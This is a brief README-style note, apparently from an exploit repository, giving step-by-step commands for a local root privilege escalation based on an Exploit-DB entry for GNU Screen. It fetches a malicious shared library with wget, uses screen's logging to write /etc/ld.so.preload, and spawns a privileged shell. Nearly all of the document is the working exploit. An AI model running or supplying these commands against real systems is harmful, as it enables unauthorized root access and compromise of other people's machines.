# Priv Esc
Based on https://www.exploit-db.com/exploits/41154

Remember to download libhax.so from this repo
```
cd /tmp
wget http://127.0.0.1/libhax.so
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen ls
/bin/sh -p
```
